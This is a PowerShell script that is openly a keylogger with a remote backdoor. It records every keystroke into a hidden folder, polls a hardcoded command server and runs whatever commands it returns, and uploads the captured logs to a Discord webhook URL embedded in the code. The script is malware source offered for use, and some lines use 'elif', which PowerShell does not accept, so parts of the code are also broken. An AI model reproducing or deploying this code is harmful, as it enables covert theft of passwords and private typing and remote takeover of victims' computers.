# 1. Hardcoded target configurations
$PCName     = "chase"
$WebhookUrl = "https://discord.com/api/webhooks/1505177594226540655/BZPbc_W_oqVyfZEM0B5crFb3v3C03lgFeAU9DcdGrzUUCm_JbqsKoA8gIJMm4nlGDoxr"
$C2Url      = "https://chase-4ebb.onrender.com"
$dir        = "$env:LOCALAPPDATA\WinMedia"

if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
$logFile = "$dir\data.txt"

# 2. Native API compilation block
$Source = @'
using System;
using System.Runtime.InteropServices;
public class KeyEngine {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
}
'@
Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue

$c2Interval = 0
$discordInterval = 0
$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }

while ($true) {
    # ================= ENGINE A: ADVANCED COMBINATION KEYLOGGER =================
    # Check if key modifiers are actively being held down in memory
    $isShift = (([KeyEngine]::GetAsyncKeyState(16) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(160) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(161) -band 0x8000))
    $isCtrl  = (([KeyEngine]::GetAsyncKeyState(17) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(162) -band 0x8000))
    $isAlt   = (([KeyEngine]::GetAsyncKeyState(18) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(164) -band 0x8000))

    for ($i = 8; $i -le 190; $i++) {
        # Scan if key is tapped
        if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
            $keyText = ""
            
            # Skip logging alone tracking modifier alerts to prevent messy logs
            if ($i -eq 16 -or $i -eq 17 -or $i -eq 18 -or $i -eq 160 -or $i -eq 161 -or $i -eq 162 -or $i -eq 164) { continue }

            switch ($i) {
                8   { $keyText = " [BACKSPACE] " }
                9   { $keyText = " [TAB] " }
                13  { $keyText = "`n" }
                20  { $keyText = " [CAPS] " }
                27  { $keyText = " [ESC] " }
                32  { $keyText = " " }
                46  { $keyText = " [DEL] " }
                default {
                    $rawChar = [char]$i
                    
                    # Intercept combo states explicitly
                    if ($isCtrl)  { $keyText = " [CTRL+$rawChar] " }
                    elif ($isAlt) { $keyText = " [ALT+$rawChar] " }
                    elif ($isShift) { $keyText = " [SHIFT+$rawChar] " }
                    else { $keyText = $rawChar.ToString().ToLower() } # Defaults cleanly to lowercase characters
                }
            }

            if ($keyText -ne "") {
                try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
            }
        }
    }

    # ================= ENGINE B: REMOTE COMMAND POLLING & RESPONDING =================
    if ($c2Interval -ge 500) {
        try {
            $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
            if ($cmdResponse -and $cmdResponse -ne 'wait') {
                $output = (Invoke-Expression $cmdResponse 2>&1 | Out-String)
                if (!$output) { $output = 'Command executed with no return data.' }
                
                # FIXED: Transmit output explicitly via unified query arguments to accommodate your existing Flask receiver layout
                $postUrl = "${C2Url}/send_res?id=${PCName}"
                Invoke-RestMethod -Uri $postUrl -Method Post -Body $output -Headers $headers -TimeoutSec 5 | Out-Null
            }
        } catch {}
        $c2Interval = 0
    }

    # ================= ENGINE C: DISCORD EXFILTRATION SYSTEM =================
    if ($discordInterval -ge 6000) {
        if (Test-Path $logFile) {
            if ((Get-Item $logFile).Length -gt 0) {
                try {
                    $timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
                    $fileName = "${PCName}_${timestamp}.txt"
                    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form @{ file = Get-Item $logFile; filename = $fileName } -TimeoutSec 10 | Out-Null
                    Clear-Content $logFile -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        $discordInterval = 0
    }

    Start-Sleep -m 10
    $c2Interval += 10
    $discordInterval += 10
}
